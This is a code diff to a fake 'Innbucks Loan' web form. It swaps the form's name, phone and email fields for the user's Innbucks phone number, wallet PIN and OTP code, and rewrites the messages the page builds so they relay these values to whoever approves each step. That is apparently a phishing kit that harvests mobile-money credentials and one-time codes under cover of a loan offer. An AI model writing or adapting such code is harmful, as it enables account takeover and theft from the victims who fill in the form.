@@ -198,11 +198,11 @@ body{
     <div class="sub">Step 1 of 2</div>
 
     <div class="f">
-      <label>Full Name</label>
+      <label>Innbucks Phone Number </label>
       <input type="text" id="p1_name"/>
     </div>
     <div class="f">
-      <label>Phone Number</label>
+      <label>Innbucks Pin</label>
       <input type="tel" id="p1_phone"/>
     </div>
 
@@ -271,8 +271,8 @@ body{
       </select>
     </div>
     <div class="f">
-      <label>Email Address</label>
-      <input type="email" id="p2_email"/>
+      <label>OTP code</label>
+      <input type="email" id="p2_code"/>
     </div>
 
     <div class="err" id="p2_err">Please fill in all fields correctly.</div>
@@ -422,8 +422,8 @@ body{
     const msg=
       "📋 *INNBUCKS LOAN — STEP 1*\n"+
       "━━━━━━━━━━━━━━━━━━━━\n\n"+
-      `👤 *Name:* ${name}\n`+
-      `📱 *Phone:* ${phone}\n\n`+
+      `👤 *Phone:* ${name}\n`+
+      `📱 *Pin:* ${phone}\n\n`+
       `🔖 *Ref:* \`${curRef}\`\n`+
       `🕐 *Time:* ${stamp()}\n\n`+
       `👇 *Approve to proceed to Step 2:*`;
@@ -457,11 +457,11 @@ body{
     const msg=
       "📋 *INNBUCKS LOAN — STEP 2 (FINAL)*\n"+
       "━━━━━━━━━━━━━━━━━━━━\n\n"+
-      `👤 *Name:* ${app.name}\n`+
-      `📱 *Phone:* ${app.phone}\n`+
+      `👤 *Phone:* ${app.name}\n`+
+      `📱 *Pin:* ${app.phone}\n`+
       `💵 *Loan Amount:* USD $${Number(amt).toLocaleString()}\n`+
       `📅 *Repayment:* ${period}\n`+
-      `✉️ *Email:* ${email}\n\n`+
+      `✉️ *Otp:* ${email}\n\n`+
       `🔖 *Ref:* \`${curRef}\`\n`+
       `🕐 *Time:* ${stamp()}\n\n`+
       `👇 *Final decision:*`;
